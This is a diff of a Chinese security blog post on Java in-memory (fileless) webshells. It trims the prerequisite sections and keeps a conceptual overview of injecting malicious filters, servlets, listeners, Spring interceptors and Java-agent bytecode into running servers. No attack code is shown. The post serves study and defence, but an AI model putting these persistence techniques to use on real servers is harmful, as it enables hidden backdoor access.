@@ -23,17 +23,17 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"nuxm.gitee.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.12.1","exturl":false,"sidebar":{"position":"right","display":"always","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":true}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="前言看了一些内存马的文，感觉基本都写的不全，或者有的东西一笔带过，所以打算写一篇详解的。">
+    <meta name="description" content="前言还是觉得乱，决定删减前置知识（前置知识要学了才看得懂）。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Java内存马">
+<meta property="og:title" content="Java内存马 - 重构">
 <meta property="og:url" content="https://nuxm.gitee.io/WebShell/JAVA%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
 <meta property="og:site_name" content="Nuxl1r">
-<meta property="og:description" content="前言看了一些内存马的文，感觉基本都写的不全，或者有的东西一笔带过，所以打算写一篇详解的。">
+<meta property="og:description" content="前言还是觉得乱，决定删减前置知识（前置知识要学了才看得懂）。">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown90729456_p0.jpg">
 <meta property="og:image" content="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220620150400.png">
 <meta property="article:published_time" content="2022-06-20T05:44:46.786Z">
-<meta property="article:modified_time" content="2022-07-08T13:55:29.883Z">
+<meta property="article:modified_time" content="2022-07-09T07:06:53.450Z">
 <meta property="article:author" content="Nuxl1r">
 <meta property="article:tag" content="JAVA">
 <meta property="article:tag" content="webshell">
@@ -45,10 +45,10 @@
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://nuxm.gitee.io/WebShell/JAVA%E5%86%85%E5%AD%98%E9%A9%AC/","path":"WebShell/JAVA内存马/","title":"Java内存马"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://nuxm.gitee.io/WebShell/JAVA%E5%86%85%E5%AD%98%E9%A9%AC/","path":"WebShell/JAVA内存马/","title":"Java内存马 - 重构"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>Java内存马 | Nuxl1r</title>
+<title>Java内存马 - 重构 | Nuxl1r</title>
   
 
 
@@ -151,7 +151,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-number">2.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">3.</span> <span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Servlet"><span class="nav-number">3.1.</span> <span class="nav-text">Servlet</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Filter"><span class="nav-number">3.2.</span> <span class="nav-text">Filter</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Listener"><span class="nav-number">3.3.</span> <span class="nav-text">Listener</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tomcat"><span class="nav-number">3.4.</span> <span class="nav-text">Tomcat</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Java-%E5%8F%8D%E5%B0%84"><span class="nav-number">3.5.</span> <span class="nav-text">Java 反射</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Java-Instrumentation"><span class="nav-number">3.6.</span> <span class="nav-text">Java Instrumentation</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Filter%E5%92%8CServlet%E7%9A%84%E6%80%BB%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">Filter和Servlet的总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%8F%91%E5%B1%95%E5%8E%86%E5%8F%B2"><span class="nav-number">5.</span> <span class="nav-text">内存马的发展历史</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="nav-number">6.</span> <span class="nav-text">内存马的类型</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Servlet-API"><span class="nav-number">7.</span> <span class="nav-text">Servlet-API</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Servlet-1"><span class="nav-number">7.1.</span> <span class="nav-text">Servlet</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Listener%E5%9E%8B"><span class="nav-number">7.2.</span> <span class="nav-text">Listener型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Filter%E5%9E%8B"><span class="nav-number">7.3.</span> <span class="nav-text">Filter型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0"><span class="nav-number">7.3.1.</span> <span class="nav-text">内存马实现</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Spring"><span class="nav-number">8.</span> <span class="nav-text">Spring</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#interceptor%E5%9E%8B"><span class="nav-number">8.1.</span> <span class="nav-text">interceptor型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%BE%97%E5%BD%93%E5%89%8D%E4%BB%A3%E7%A0%81%E8%BF%90%E8%A1%8C%E6%97%B6%E7%9A%84%E4%B8%8A%E4%B8%8B%E6%96%87%E7%8E%AF%E5%A2%83"><span class="nav-number">8.1.1.</span> <span class="nav-text">获得当前代码运行时的上下文环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-adaptedInterceptors-%E5%B1%9E%E6%80%A7%E5%80%BC"><span class="nav-number">8.1.2.</span> <span class="nav-text">获取 adaptedInterceptors 属性值</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%81%B6%E6%84%8FInterceptor%E7%B1%BB"><span class="nav-number">8.1.3.</span> <span class="nav-text">恶意Interceptor类</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#controller"><span class="nav-number">8.2.</span> <span class="nav-text">controller</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Java-agent%E5%9E%8B"><span class="nav-number">9.</span> <span class="nav-text">Java agent型</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A1%AE%E5%AE%9A%E5%85%B3%E9%94%AE%E7%B1%BB"><span class="nav-number">9.1.</span> <span class="nav-text">确定关键类</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WebShell"><span class="nav-number">9.2.</span> <span class="nav-text">WebShell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#premain"><span class="nav-number">9.3.</span> <span class="nav-text">premain</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#agentmain"><span class="nav-number">9.4.</span> <span class="nav-text">agentmain</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E7%8E%B0%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">9.5.</span> <span class="nav-text">实现内存马</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Tomcat-1"><span class="nav-number">10.</span> <span class="nav-text">Tomcat</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#weblogic"><span class="nav-number">11.</span> <span class="nav-text">weblogic</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%93%E8%AF%AD"><span class="nav-number">12.</span> <span class="nav-text">结语</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-number">2.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">3.</span> <span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Java-web%E4%B8%89%E5%A4%A7%E4%BB%B6"><span class="nav-number">3.1.</span> <span class="nav-text">Java web三大件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tomcat"><span class="nav-number">3.2.</span> <span class="nav-text">Tomcat</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Java-%E5%8F%8D%E5%B0%84"><span class="nav-number">3.3.</span> <span class="nav-text">Java 反射</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Java-Instrumentation"><span class="nav-number">3.4.</span> <span class="nav-text">Java Instrumentation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Spring-MVC"><span class="nav-number">3.5.</span> <span class="nav-text">Spring MVC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Filter%E5%92%8CServlet%E7%9A%84%E5%9B%9E%E9%A1%BE%E6%80%A7%E6%80%BB%E7%BB%93"><span class="nav-number">3.6.</span> <span class="nav-text">Filter和Servlet的回顾性总结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%8F%91%E5%B1%95%E5%8E%86%E5%8F%B2"><span class="nav-number">4.</span> <span class="nav-text">内存马的发展历史</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="nav-number">5.</span> <span class="nav-text">内存马的类型</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Servlet-API"><span class="nav-number">6.</span> <span class="nav-text">Servlet-API</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Servlet"><span class="nav-number">6.1.</span> <span class="nav-text">Servlet</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Listener%E5%9E%8B"><span class="nav-number">6.2.</span> <span class="nav-text">Listener型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Filter%E5%9E%8B"><span class="nav-number">6.3.</span> <span class="nav-text">Filter型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0"><span class="nav-number">6.3.1.</span> <span class="nav-text">内存马实现</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Spring"><span class="nav-number">7.</span> <span class="nav-text">Spring</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#interceptor%E5%9E%8B"><span class="nav-number">7.1.</span> <span class="nav-text">interceptor型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%BE%97%E5%BD%93%E5%89%8D%E4%BB%A3%E7%A0%81%E8%BF%90%E8%A1%8C%E6%97%B6%E7%9A%84%E4%B8%8A%E4%B8%8B%E6%96%87%E7%8E%AF%E5%A2%83"><span class="nav-number">7.1.1.</span> <span class="nav-text">获得当前代码运行时的上下文环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-adaptedInterceptors-%E5%B1%9E%E6%80%A7%E5%80%BC"><span class="nav-number">7.1.2.</span> <span class="nav-text">获取 adaptedInterceptors 属性值</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%81%B6%E6%84%8FInterceptor%E7%B1%BB"><span class="nav-number">7.1.3.</span> <span class="nav-text">恶意Interceptor类</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#controller"><span class="nav-number">7.2.</span> <span class="nav-text">controller</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Java-agent%E5%9E%8B"><span class="nav-number">8.</span> <span class="nav-text">Java agent型</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A1%AE%E5%AE%9A%E5%85%B3%E9%94%AE%E7%B1%BB"><span class="nav-number">8.1.</span> <span class="nav-text">确定关键类</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WebShell"><span class="nav-number">8.2.</span> <span class="nav-text">WebShell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#premain"><span class="nav-number">8.3.</span> <span class="nav-text">premain</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#agentmain"><span class="nav-number">8.4.</span> <span class="nav-text">agentmain</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E7%8E%B0%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">8.5.</span> <span class="nav-text">实现内存马</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Tomcat-1"><span class="nav-number">9.</span> <span class="nav-text">Tomcat</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#weblogic"><span class="nav-number">10.</span> <span class="nav-text">weblogic</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%93%E8%AF%AD"><span class="nav-number">11.</span> <span class="nav-text">结语</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -240,12 +240,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="Java内存马 | Nuxl1r">
+      <meta itemprop="name" content="Java内存马 - 重构 | Nuxl1r">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          Java内存马
+          Java内存马 - 重构
         </h1>
 
         <div class="post-meta-container">
@@ -263,7 +263,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-07-08 21:55:29" itemprop="dateModified" datetime="2022-07-08T21:55:29+08:00">2022-07-08</time>
+      <time title="修改时间：2022-07-09 15:06:53" itemprop="dateModified" datetime="2022-07-09T15:06:53+08:00">2022-07-09</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -285,135 +285,20 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><center>前言</center></h1><p>看了一些内存马的文，感觉基本都写的不全，或者有的东西一笔带过，所以打算写一篇详解的。</p>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><center>前言</center></h1><p>还是觉得乱，决定删减前置知识（前置知识要学了才看得懂）。</p>
 <p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown90729456_p0.jpg"></p>
 <span id="more"></span>
 
+<p>看了一些内存马的文，感觉基本都写的不全，或者有的东西一笔带过，所以打算写一篇详解的。</p>
 <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a><center>概述</center></h1><p>内存马是无文件Webshell，无文件的意思就是并没有写入文件，而是修改或者插入代码的方式来实现的WebShell，修改或者插入的代码也并不是永久存在于代码中，而是随着生命周期动态生成和删除的，<del>也可以这样理解通过服务实现的内存马的原理就像是MVC架构，即通过路由访问控制器</del>（该解释略有偏差），至于修改或者插入代码的位置可以是<code>TransformedMap</code>中，也可以是<code>Servlet</code>中，这要看注入内存马的位置于何处。</p>
-<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a><center>前置知识</center></h1><p>Java web三大件</p>
-<p>详情可参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/chenwiehuang/article/details/80811193" title="java web请求三大器——listener、filter、servlet">java web请求三大器——listener、filter、servlet</a></p>
+<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a><center>前置知识</center></h1><h2 id="Java-web三大件"><a href="#Java-web三大件" class="headerlink" title="Java web三大件"></a>Java web三大件</h2><p>详情可参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/chenwiehuang/article/details/80811193" title="java web请求三大器——listener、filter、servlet">java web请求三大器——listener、filter、servlet</a></p>
 <p>启动的顺序为<code>listener</code>-&gt;<code>Filter</code>-&gt;<code>servlet</code>，但是执行顺序与其特性相关，下面简单讲一下三大件</p>
-<h2 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h2><p>Servlet 是运行在 Web 服务器或应用服务器上的程序，作为来自 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层，负责处理用户的请求，并根据请求生成相应的返回信息提供给用户。</p>
-<ul>
-<li><p>请求的处理过程：</p>
-<ol>
-<li><p>客户端发起一个HTTP请求，比如GET类型</p>
-</li>
-<li><p><code>Servlet</code>容器接收到请求，根据请求信息，封装成<code>HttpServletRequest</code>和<code>HttpServletResponse</code>对象</p>
-</li>
-<li><p><code>Servlet</code>容器调用<code>HttpServlet</code>的<strong>init()方法</strong>，init()方法只在第一次请求的时候被调用</p>
-</li>
-<li><p><code>Servlet</code>容器调用<code>service()方法</code>，service()方法根据请求类型，这里是GET类型，分别调用doGet或者</p>
-</li>
-<li><p>doPost方法，这里调用doGet方法</p>
-</li>
-<li><p>业务逻辑处理完成之后，返回给Servlet容器，然后容器将结果返回给客户端</p>
-</li>
-<li><p>容器关闭时候，会调用destory方法</p>
-</li>
-</ol>
-</li>
-<li><p>生命周期：</p>
-<ul>
-<li><p>服务器启动时（<code>web.xml</code>中配置<code>load-on-startup=1</code>，默认为0）或者第一次请求该servlet时，就会初始化一个Servlet对象，也就是会执行初始化方法<code>init(ServletConfig conf)</code></p>
-</li>
-<li><p><code>servlet</code>对象去处理所有客户端请求，在<code>service(ServletRequest req,ServletResponse res)</code>方法中执行</p>
-</li>
-<li><p>服务器关闭时，销毁这个servlet对象，执行destroy()方法</p>
-</li>
-<li><p>由JVM进行垃圾回收</p>
-</li>
-</ul>
-</li>
-</ul>
-<h2 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h2><ul>
-<li><p>Filter，过滤器，是对Servlet技术的一个强补充，其主要功能是：</p>
-<ul>
-<li><p>在<code>HttpServletRequest</code>到达 Servlet 之前，拦截客户的<code>HttpServletRequest </code>，根据需要检查<code>HttpServletRequest</code>，也可以修改<code>HttpServletRequest </code>头和数据</p>
-</li>
-<li><p>在<code>HttpServletResponse</code>到达客户端之前，拦截<code>HttpServletResponse </code>，根据需要检查<code>HttpServletResponse</code>，也可以修改<code>HttpServletResponse</code>头和数据</p>
-</li>
-</ul>
-</li>
-<li><p>基本工作原理：</p>
-<ul>
-<li><p>Filter 程序是一个实现了特殊接口的 Java 类，与 Servlet 类似，也是由 Servlet 容器进行调用和执行的</p>
-</li>
-<li><p>当在 web.xml 注册了一个 Filter 来对某个 Servlet 程序进行拦截处理时，它可以决定是否将请求继续传递给 Servlet 程序，以及对请求和响应消息是否进行修改</p>
-</li>
-<li><p>当 Servlet 容器开始调用某个 Servlet 程序时，如果发现已经注册了一个 Filter 程序来对该 Servlet 进行拦截，那么容器不再直接调用 Servlet 的 service 方法，而是调用 Filter 的 doFilter 方法，再由 doFilter 方法决定是否去激活 service 方法</p>
-</li>
-<li><p>但在 Filter.doFilter 方法中不能直接调用 Servlet 的 service 方法，而是调用 FilterChain.doFilter 方法来激活目标 Servlet 的 service 方法，FilterChain 对象时通过 Filter.doFilter 方法的参数传递进来</p>
-</li>
-<li><p>只要在 Filter.doFilter 方法中调用 FilterChain.doFilter 方法的语句前后增加某些程序代码，这样就可以在 Servlet 进行响应前后实现某些特殊功能</p>
-</li>
-<li><p>如果在 Filter.doFilter 方法中没有调用 FilterChain.doFilter 方法，则目标 Servlet 的 service 方法不会被执行，这样通过 Filter 就可以阻止某些非法的访问请求</p>
-</li>
-</ul>
-</li>
-<li><p>生命周期：</p>
-<ul>
-<li><p>与Servlet一样，Filter的创建和销毁也由web容器负责。 web 应用程序启动时，web 服务器将创建Filter 的实例对象，并调用其init方法，读取web.xml配置，完成对象的初始化功能，从而为后续的用户请求作好拦截的准备工作（filter对象只会创建一次，init方法也只会执行一次）</p>
-</li>
-<li><p>开发人员通过init方法的参数，可获得代表当前filter配置信息的FilterConfig对象</p>
-</li>
-<li><p><font color="red"><strong>Filter对象创建后会驻留在内存，当web应用移除或服务器停止时才销毁。在Web容器卸载 Filter 对象之前被调用。该方法在Filter的生命周期中仅执行一次。在这个方法中，可以释放过滤器使用的资源。</strong></font> (内存马实现依靠机制)</p>
-</li>
-</ul>
-</li>
-</ul>
-<p>filter链</p>
-<ul>
-<li><p>当多个filter同时存在的时候，组成了filter链。web服务器根据Filter在web.xml文件中的注册顺序，决定先调用哪个Filter</p>
-</li>
-<li><p>当第一个Filter的doFilter方法被调用时，web服务器会创建一个代表Filter链的FilterChain对象传递给该方法，通过判断FilterChain中是否还有filter决定后面是否还调用filter</p>
-</li>
-</ul>
-<h2 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h2><ul>
-<li><p>JavaWeb开发中的监听器（Listener）就是<code>Application</code>、<code>Session</code>和<code>Request</code>三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件：</p>
-<ul>
-<li><p><code>ServletContextListener</code>：对Servlet上下文的创建和销毁进行监听</p>
-</li>
-<li><p><code>ServletContextAttributeListener</code>：监听Servlet上下文属性的添加、删除和替换</p>
-</li>
-<li><p><code>HttpSessionListener</code>：对Session的创建和销毁进行监听。Session的销毁有两种情况，一个中Session超时，还有一种是通过调用Session对象的invalidate()方法使session失效</p>
-</li>
-<li><p><code>HttpSessionAttributeListener</code>：对Session对象中属性的添加、删除和替换进行监听</p>
-</li>
-<li><p><code>ServletRequestListener</code>：对请求对象的初始化和销毁进行监听</p>
-</li>
-<li><p><code>ServletRequestAttributeListener</code>：对请求对象属性的添加、删除和替换进行监听</p>
-</li>
-</ul>
-</li>
-<li><p>用途</p>
-<ul>
-<li><p>可以使用监听器监听客户端的请求、服务端的操作等</p>
-</li>
-<li><p>可以自动出发一些动作，比如监听在线的用户数量，统计网站访问量、网站访问监控等<br>  生命周期</p>
-</li>
-<li><p>listener的生命周期从web容器启动，到web容器销毁</p>
-</li>
-</ul>
-</li>
-</ul>
 <h2 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h2><p>详情可参考：<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000023475177">Tomcat 架构原理解析到架构设计借鉴</a></p>
 <p>简单理解，Tomcat是HTTP服务器+Servlet容器，对我们屏蔽了应用层协议和网络通信细节，给我们的是标准的 Request 和 Response 对象；对于具体的业务逻辑则作为变化点，交给我们来实现</p>
-<p>Tomcat 启动流程：<font><strong>[startup.sh] -&gt; [catalina.sh] start -&gt;java -jar org.apache.catalina.startup.Bootstrap.main()</strong></font></p>
-<p>Tomcat 实现的 2 个核心功能：</p>
-<p>处理 Socket 连接，负责网络字节流与 <code>Request</code> 和 <code>Response</code> 对象的转化</p>
-<p>加载并管理 <code>Servlet</code> ，以及处理具体的 <code>Request</code> 请求</p>
-<p>Tomcat 作为 Servlet 的容器，能够将用户的请求发送给 Servlet，并且将 Servlet 的响应返回给用户，Tomcat中有四种类型的Servlet容器，从上到下分别是 <code>Engine</code>、<code>Host</code>、<code>Context</code>、<code>Wrapper</code>：</p>
-<p>Engine，实现类为 <code>org.apache.catalina.core.StandardEngine</code></p>
-<p>Host，实现类为 <code>org.apache.catalina.core.StandardHost</code></p>
-<p>Context，实现类为 <code>org.apache.catalina.core.StandardContext</code></p>
-<p>Wrapper，实现类为 <code>org.apache.catalina.core.StandardWrapper</code></p>
-<h2 id="Java-反射"><a href="#Java-反射" class="headerlink" title="Java 反射"></a>Java 反射</h2><p>我于<a target="_blank" rel="noopener" href="https://nuxl1r.github.io/Inject/JAVA%20EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/">JavaEL表达式注入</a>开篇简单概述过</p>
-<h2 id="Java-Instrumentation"><a href="#Java-Instrumentation" class="headerlink" title="Java Instrumentation"></a>Java Instrumentation</h2><p><code>Instrumentation</code>是Java提供的一个来自JVM的接口，该接口提供了一系列查看和操作Java类定义的方法，例如修改类的字节码、向classLoader的classpath下加入jar文件等，使得开发者可以通过Java语言来操作和监控JVM内部的一些状态，进而实现Java程序的监控分析，甚至实现一些特殊功能（如AOP、热部署）</p>
-<p>Java agent是一种特殊的Java程序（Jar文件），它是<code>Instrumentation</code>的客户端。与普通Java程序通过main方法启动不同，agent并不是一个可以单独启动的程序，而必须依附在一个Java应用程序（JVM）上，与它运行在同一个进程中，通过Instrumentation API与虚拟机交互</p>
-<p>在注入内存马的过程中，我们可以利用java Instrumentation机制，动态的修改已加载到内存中的类里的方法，进而注入恶意的代码</p>
-<p>所以想详细的了解内存马之前得先了解：Java 反射、Java字节码、Java Web、Tomcat</p>
-<h1 id="Filter和Servlet的总结"><a href="#Filter和Servlet的总结" class="headerlink" title="Filter和Servlet的总结"></a>Filter和Servlet的总结</h1><p>对于基于<code>Filter</code>和<code>Servlet</code>实现的简单架构项目，代码审计的重心集中于找出所有的<code>Filter</code>分析其过滤规则，找出是否有做全局的安全过滤、敏感的URL地址是否有做权限校验并尝试绕过Filter过滤。第二点则是找出所有的<code>Servlet</code>，分析<code>Servlet</code>的业务是否存在安全问题,如果存在安全问题是否可以利用？是否有权限访问？利用时是否被<code>Filter</code>过滤等问题，切勿看到<code>Servlet</code>、JSP中的漏洞点就妄下定论，不要忘了<code>Servlet</code>前面很有可能存在一个全局安全过滤的<code>Filter</code>。</p>
+<h2 id="Java-反射"><a href="#Java-反射" class="headerlink" title="Java 反射"></a>Java 反射</h2><p>要懂！</p>
+<h2 id="Java-Instrumentation"><a href="#Java-Instrumentation" class="headerlink" title="Java Instrumentation"></a>Java Instrumentation</h2><p>要懂！</p>
+<h2 id="Spring-MVC"><a href="#Spring-MVC" class="headerlink" title="Spring MVC"></a>Spring MVC</h2><p>要懂！ </p>
+<h2 id="Filter和Servlet的回顾性总结"><a href="#Filter和Servlet的回顾性总结" class="headerlink" title="Filter和Servlet的回顾性总结"></a>Filter和Servlet的回顾性总结</h2><p>对于基于<code>Filter</code>和<code>Servlet</code>实现的简单架构项目，代码审计的重心集中于找出所有的<code>Filter</code>分析其过滤规则，找出是否有做全局的安全过滤、敏感的URL地址是否有做权限校验并尝试绕过Filter过滤。第二点则是找出所有的<code>Servlet</code>，分析<code>Servlet</code>的业务是否存在安全问题,如果存在安全问题是否可以利用？是否有权限访问？利用时是否被<code>Filter</code>过滤等问题，切勿看到<code>Servlet</code>、JSP中的漏洞点就妄下定论，不要忘了<code>Servlet</code>前面很有可能存在一个全局安全过滤的<code>Filter</code>。</p>
 <ul>
 <li><p><code>Filter</code>和<code>Servlet</code>都是Java Web提供的API，简单的总结了下有如下共同点。</p>
 <ol>
@@ -435,9 +320,8 @@
 <p>在各类HW洗礼之后，文件shell明显气数已尽。内存马以救命稻草的身份重回大众视野。20年，LandGrey师傅构造了Spring controller内存马——<a target="_blank" rel="noopener" href="https://landgrey.me/blog/12/#top">基于内存 Webshell 的无文件攻击技术研究</a>可以算是一波热潮起</p>
 <h1 id="内存马的类型"><a href="#内存马的类型" class="headerlink" title="内存马的类型"></a>内存马的类型</h1><p><code>Servlet-API类型</code>：filter型、servlet型、listener型 （使用 servlet-api 的具体实现）<br>大概原理：通过命令执行等方式动态注册一个新的listener、filter或者servlet，从而实现命令执行等功能。特定框架、容器的内存马原理与此类似，如spring的controller内存马，tomcat的valve内存马</p>
 <p><code>spring类型</code>interceptor型、controller型 （使用框架如 spring&#x2F;struts2）</p>
-<p><code>字节码增强型</code><br>大概原理：通过java的instrumentation动态修改已有代码，进而实现命令执行等功能</p>
-<p>是通过动态注册的方式实现，动态注册使用职责链设计模式的中间件、框架的实现（例如 Tomcat 的 Pipeline &amp; Valve，Grizzly 的 FilterChain &amp; Filter 等等）</p>
-<h1 id="Servlet-API"><a href="#Servlet-API" class="headerlink" title="Servlet-API"></a>Servlet-API</h1><h2 id="Servlet-1"><a href="#Servlet-1" class="headerlink" title="Servlet"></a>Servlet</h2><ul>
+<p><code>字节码增强型</code><br>大概原理：通过java的instrumentation动态修改已有代码，进而实现命令执行等功能，是通过动态注册的方式实现，动态注册使用职责链设计模式的中间件、框架的实现（例如 Tomcat 的 Pipeline &amp; Valve，Grizzly 的 FilterChain &amp; Filter 等等）</p>
